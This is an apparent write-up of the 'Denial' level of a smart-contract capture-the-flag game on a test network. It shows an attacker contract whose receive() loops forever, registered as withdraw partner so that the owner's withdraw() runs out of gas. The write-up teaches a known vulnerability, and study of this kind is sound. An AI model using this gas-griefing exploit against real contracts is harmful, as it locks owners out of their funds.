# Denial

## Objectives

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

## Solution

The message call in the Denial contract does not specify an amount of gas, so we can define a `receive()` fallback function in our attacker contract that will be so expensive that unless the `partner` address is changed, it will not be possible to call the `withdraw()` function.

1. Code and deploy an attacker contract. The attacker should have a `receive()` fallback function that runs some set of instructions that are extremely expensive.

2. Make the attacker contract `partner` through the `setWithdrawPartner()` function.

If a specific amount to spend had been set, execution would not halt and the `transfer()` function in line 24 would have executed without issues.

## How I did it

1. I coded and deployed (at: `0x5708A3c4d9472B9D6951200c6d6C2FB82ef96c50`) an attacker contract with a `receive()` fallback function defined as follows:

```cs
receive() external payable {
    while (true) {
        foreverLooping += 1;
        if (foreverLooping > 0) {foreverLooping = 0;}
    }
}
```

Where `foreverLooping` is a state variable:

```cs
uint256 private foreverLooping;
```

In python:

```python
denialattack = DenialAttack.deploy(denial.address, _from)
```


2. I made the contract `partner` through a function inside the contract I defined which calls `setWithdrawPartner()` in Denial through an interface:

```cs
function setThisAsWithdrawPartner() public {
    denialContract.setWithdrawPartner(address(this));
}
```

Where `denialContract` is the interface object.

In python:

```python
denialattack.setThisAsWithdrawPartner(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xdee6f9ca64398992a8f98aecdbaab5ffa3e411ae9b104b4e06b677fb4aa1731c

3. I tested calling the `withdraw()` function myself within a try-except block, since I usually get an `RPCRequestError` when trying to access the `revert_msg` attribute of a reverted transaction. However, if I did get the `revert_msg` anyway, this would also still work:

```python
# test withdraw() to see if the tx fails
try:
    tx = denial.withdraw(_from | {'allow_revert':True})
    # fail tx assertion
    fail_tx_assertion = False

except:
    # fail tx assertion
    fail_tx_assertion = True

print(f"The transaction failed/reverted: {fail_tx_assertion}")
```

With this call, I determine through the assertion if the action of the challenge instance will work or not.

Block explorer: https://rinkeby.etherscan.io/tx/0xdc37b616c23234b2f87eaeda94715482580a129c6ce2bad5f28a77aefd5b79c7 (reverted tx)

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x778e0059d279b716c24808fd4ecc2ea79ca6b7396ee05da2e7ed35ea6ca3733b
